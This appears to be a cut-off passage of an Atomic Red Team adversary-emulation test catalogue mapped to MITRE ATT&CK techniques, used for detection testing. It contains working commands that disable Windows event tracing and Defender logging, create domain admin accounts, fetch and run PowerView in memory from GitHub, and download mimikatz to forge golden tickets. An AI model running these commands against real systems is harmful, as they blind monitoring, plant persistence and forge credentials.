["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).", "atomic_tests": [{"name": "Auditing Configuration Changes on Linux Host", "auto_generated_guid": "212cfbcf-4770-4980-bc21-303e37abd0e3", "description": "Emulates modification of auditd configuration files\n", "supported_platforms": ["linux"], "input_arguments": {"audisp_config_file_name": {"description": "The name of the audispd configuration file to be changed", "type": "string", "default": "audispd.conf"}, "auditd_config_file_name": {"description": "The name of the auditd configuration file to be changed", "type": "string", "default": "auditd.conf"}, "libaudit_config_file_name": {"description": "The name of the libaudit configuration file to be changed", "type": "string", "default": "libaudit.conf"}}, "executor": {"command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n", "cleanup_command": "sed -i '$ d' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{auditd_config_file_name}\nelse sed -i '$ d' /etc/audit/#{auditd_config_file_name}\nfi\nsed -i '$ d' /etc/#{libaudit_config_file_name}\n", "name": "bash", "elevation_required": true}}, {"name": "Auditing Configuration Changes on FreeBSD Host", "auto_generated_guid": "cedaf7e7-28ee-42ab-ba13-456abd35d1bd", "description": "Emulates modification of auditd configuration files\n", "supported_platforms": ["linux"], "input_arguments": {"auditd_config_file_name": {"description": "The name of the auditd configuration file to be changed", "type": "string", "default": "audit_event"}}, "executor": {"command": "echo '#art_test_1562_006_1' >> /etc/security/#{auditd_config_file_name}\n", "cleanup_command": "sed -i \"\" '/#art_test_1562_006_1/d' /etc/security/#{auditd_config_file_name}\n", "name": "sh", "elevation_required": true}}, {"name": "Logging Configuration Changes on Linux Host", "auto_generated_guid": "7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c", "description": "Emulates modification of syslog configuration.\n", "supported_platforms": ["linux"], "input_arguments": {"syslog_config_file_name": {"description": "The name of the syslog configuration file to be changed", "type": "string", "default": "syslog.conf"}, "rsyslog_config_file_name": {"description": "The name of the rsyslog configuration file to be changed", "type": "string", "default": "rsyslog.conf"}, "syslog_ng_config_file_name": {"description": "The name of the syslog-ng configuration file to be changed", "type": "string", "default": "syslog-ng.conf"}}, "executor": {"command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n", "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n", "name": "bash", "elevation_required": true}}, {"name": "Logging Configuration Changes on FreeBSD Host", "auto_generated_guid": "6b8ca3ab-5980-4321-80c3-bcd77c8daed8", "description": "Emulates modification of syslog configuration.\n", "supported_platforms": ["linux"], "input_arguments": {"syslog_config_file_name": {"description": "The name of the syslog configuration file to be changed", "type": "string", "default": "syslog.conf"}}, "executor": {"command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}\nfi\n", "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i \"\" '/#art_test_1562_006_2/d' /etc/#{syslog_config_file_name}\nfi\n", "name": "sh", "elevation_required": true}}, {"name": "Disable Powershell ETW Provider - Windows", "auto_generated_guid": "6f118276-121d-4c09-bb58-a8fb4a72ee84", "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.", "supported_platforms": ["windows"], "input_arguments": {"ps_exec_location": {"description": "Location of PSExec.", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe"}, "session": {"description": "The session to disable.", "type": "string", "default": "EventLog-Application"}, "provider": {"description": "The provider to disable.", "type": "string", "default": "Microsoft-Windows-Powershell"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PSExec must be installed on the machine.", "prereq_command": "if (Test-Path \"#{ps_exec_location}\") {exit 0} else {exit 1}", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\pstools\" -force"}], "executor": {"command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets", "cleanup_command": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets", "name": "powershell", "elevation_required": true}}, {"name": "Disable .NET Event Tracing for Windows Via Registry (cmd)", "auto_generated_guid": "8a4c33be-a0d3-434a-bee6-315405edbd5b", "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry", "supported_platforms": ["windows"], "executor": {"command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0", "cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable .NET Event Tracing for Windows Via Registry (powershell)", "auto_generated_guid": "19c07a45-452d-4620-90ed-4c34fffbe758", "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force", "cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1", "name": "powershell", "elevation_required": true}}, {"name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd", "auto_generated_guid": "f6df0b8e-2c83-44c7-ba5e-0fa4386bec41", "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell", "auto_generated_guid": "69fc085b-5444-4879-8002-b24c8e1a3e02", "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n", "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}]}, "T1136.002": {"name": "Domain Account", "technique_id": "attack-pattern--7610cada-1499-41a4-b3dd-46467b68d177", "external_id": "T1136.002", "data_components": ["Process Creation", "User Account Creation", "Command Execution"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b045d015-6bed-4490-bd38-56b41ece59a0"], "description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "atomic_tests": [{"name": "Create a new Windows domain admin user", "auto_generated_guid": "fcec2963-9951-4173-9bfa-98d8b7834e62", "description": "Creates a new domain admin user in a command prompt.\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "T1136.002_Admin"}, "password": {"description": "Password of the user to create", "type": "string", "default": "T1136_pass123!"}, "group": {"description": "Domain administrator group to which add the user to", "type": "string", "default": "Domain Admins"}}, "executor": {"command": "net user \"#{username}\" \"#{password}\" /add /domain\nnet group \"#{group}\" \"#{username}\" /add /domain\n", "cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n", "name": "command_prompt", "elevation_required": false}}, {"name": "Create a new account similar to ANONYMOUS LOGON", "auto_generated_guid": "dc7726d2-8ccb-4cc6-af22-0d5afb53a548", "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Username of the user to create", "type": "string", "default": "ANONYMOUS  LOGON"}, "password": {"description": "Password of the user to create", "type": "string", "default": "T1136_pass123!"}}, "executor": {"command": "net user \"#{username}\" \"#{password}\" /add /domain\n", "cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n", "name": "command_prompt", "elevation_required": false}}, {"name": "Create a new Domain Account using PowerShell", "auto_generated_guid": "5a3497a4-1568-4663-b12a-d4a5ed70c7d7", "description": "Creates a new Domain User using the credentials of the Current User\n", "supported_platforms": ["windows"], "input_arguments": {"username": {"description": "Name of the Account to be created", "type": "string", "default": "T1136.002_Admin"}, "password": {"description": "Password of the Account to be created", "type": "string", "default": "T1136_pass123!"}}, "executor": {"command": "$SamAccountName = '#{username}'\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n", "cleanup_command": "cmd /c \"net user #{username} /del >nul 2>&1\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Active Directory Create Admin Account", "auto_generated_guid": "562aa072-524e-459a-ba2b-91f1afccf5ab", "description": "Use Admin Credentials to Create A Domain Admin Account\n", "supported_platforms": ["linux"], "input_arguments": {"domain": {"description": "The domain to be tested", "type": "string", "default": "example"}, "top_level_domain": {"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)", "type": "string", "default": "test"}, "admin_user": {"description": "username@domain of a user with admin privileges", "type": "string", "default": "admin@example.test"}, "admin_password": {"description": "password of the user with admin privileges referenced in admin_user", "type": "string", "default": "s3CurePssw0rD!"}, "domain_controller": {"description": "Name of the domain_controller machine, defined in etc/hosts", "type": "string", "default": "adVM"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n", "prereq_command": "which ldapadd && which ldapmodify\n", "get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"}], "executor": {"elevation_required": false, "command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: Atomic User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n", "cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n", "name": "sh"}}, {"name": "Active Directory Create User Account (Non-elevated)", "auto_generated_guid": "8c992cb3-a46e-4fd5-b005-b1bab185af31", "description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n", "supported_platforms": ["linux"], "input_arguments": {"domain": {"description": "The domain to be tested", "type": "string", "default": "example"}, "top_level_domain": {"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)", "type": "string", "default": "test"}, "admin_user": {"description": "username@domain of a user with admin privileges", "type": "string", "default": "user@example.test"}, "admin_password": {"description": "password of the user", "type": "string", "default": "s3CurePssw0rD!"}, "domain_controller": {"description": "Name of the domain_controller machine, defined in etc/hosts", "type": "string", "default": "adVM"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify\n", "prereq_command": "which ldapadd\nwhich ldapmodify\n", "get_prereq_command": "echo ldapadd or ldapmodify not found; exit 1\n"}], "executor": {"elevation_required": false, "command": "echo \"dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\nobjectClass: person\\ncn: Atomic User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n", "cleanup_command": "echo removing Atomic User (temporary user)\necho \"dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n", "name": "sh"}}]}, "T1482": {"name": "Domain Trust Discovery", "technique_id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0", "external_id": "T1482", "data_components": ["OS API Execution", "Network Traffic Content", "Script Execution", "Process Creation", "Command Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)", "atomic_tests": [{"name": "Windows - Discover domain trusts with dsquery", "auto_generated_guid": "4700a710-c821-4e17-a3ec-9e4c81d6845f", "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n", "supported_platforms": ["windows"], "executor": {"command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "name": "command_prompt"}}, {"name": "Windows - Discover domain trusts with nltest", "auto_generated_guid": "2e22641d-0498-48d2-b9ff-c71e496ccdbe", "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n", "supported_platforms": ["windows"], "dependencies": [{"description": "nltest.exe from RSAT must be present on disk\n", "prereq_command": "WHERE nltest.exe >NUL 2>&1\n", "get_prereq_command": "echo Sorry RSAT must be installed manually\n"}], "executor": {"command": "nltest /domain_trusts\nnltest /trusted_domains\n", "name": "command_prompt"}}, {"name": "Powershell enumerate domains and forests", "auto_generated_guid": "c58fbc62-8a62-489e-8f2d-3565d7d96f30", "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "PowerView PowerShell script must exist on disk\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"}, {"description": "RSAT PowerShell AD admin cmdlets must be installed\n", "prereq_command": "if ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n", "get_prereq_command": "Write-Host \"Sorry RSAT must be installed manually\"\n"}], "executor": {"command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n", "name": "powershell"}}, {"name": "Adfind - Enumerate Active Directory OUs", "auto_generated_guid": "d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit)\n", "name": "command_prompt"}}, {"name": "Adfind - Enumerate Active Directory Trusts", "auto_generated_guid": "15fe436d-e771-4ff3-b655-2dca9ba52834", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -gcb -sc trustdmp\n", "name": "command_prompt"}}, {"name": "Get-DomainTrust with PowerView", "auto_generated_guid": "f974894c-5991-4b19-aaf5-7cc2fe298c5d", "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n", "name": "powershell"}}, {"name": "Get-ForestTrust with PowerView", "auto_generated_guid": "58ed10e8-0738-4651-8408-3a3e9a526279", "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n", "name": "powershell"}}, {"name": "TruffleSnout - Listing AD Infrastructure", "auto_generated_guid": "ea1b4f2d-5b82-4006-b64f-f2845608a3bf", "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n", "supported_platforms": ["windows"], "input_arguments": {"trufflesnout_path": {"description": "Path to the TruffleSnout executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe"}, "domain": {"description": "Domain name to search on", "type": "string", "default": "%userdomain%"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})\n", "prereq_command": "if (Test-Path \"#{trufflesnout_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{trufflesnout_path}\") -Force | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe\" -OutFile \"#{trufflesnout_path}\"\n"}], "executor": {"command": "\"#{trufflesnout_path}\" forest -n #{domain}\n\"#{trufflesnout_path}\" domain -n #{domain}\n", "name": "command_prompt"}}]}, "T1558.001": {"name": "Golden Ticket", "technique_id": "attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1", "external_id": "T1558.001", "data_components": ["Active Directory Credential Request", "Logon Session Metadata"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462"], "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.", "atomic_tests": [{"name": "Crafting Active Directory golden tickets with mimikatz", "auto_generated_guid": "9726592a-dabc-4d4d-81cd-44070008b3af", "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "supported_platforms": ["windows"], "input_arguments": {"domain_sid": {"description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID", "type": "string", "default": "S-1-5-21-DEFAULT"}, "domain": {"description": "Targeted Active Directory domain FQDN", "type": "string", "default": "%userdnsdomain%"}, "account": {"description": "Account to impersonate", "type": "string", "default": "goldenticketfakeuser"}, "krbtgt_aes256_key": {"description": "Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain)", "type": "string", "default": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"}, "mimikatz_path": {"description": "Mimikatz windows executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  